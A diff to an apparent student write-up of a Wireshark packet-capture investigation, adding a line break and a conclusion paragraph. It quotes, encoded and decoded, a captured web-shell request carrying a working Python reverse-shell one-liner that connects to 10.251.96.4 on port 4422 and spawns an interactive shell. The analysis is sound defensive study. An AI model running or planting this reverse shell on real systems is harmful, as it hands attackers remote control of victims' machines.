@@ -172,7 +172,9 @@ Back to the original pcap file and follow packet #16201, which has a GET request
 You will find: /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1 
 <br>
 
-Which decoded to: /uploads/dbfunctions.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'HTTP/1.1 Looks like the attacker is using python to make a connection to 10.251.96.4 on port 4422
+Which decoded to: /uploads/dbfunctions.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'HTTP/1.1 
+<br>
+Looks like the attacker is using python to make a connection to 10.251.96.4 on port 4422
 
 <img src="images/34.png" width="900">
 <img src="images/35.png" width="900">
@@ -185,4 +187,4 @@ If you get back to the original pcap and right below packet #16201. You can find
 <br>
 
 <h2>Conclusion</h4>
-
+To sum up, this project used Wireshark to examine network traffic and understand how attackers operate. By analyzing different protocols and spotting suspicious activities like scanning and exploitation attempts, we learned about potential security weaknesses. It showed the importance of tools like Wireshark for monitoring networks and the need for strong cybersecurity measures to fend off malicious attacks.
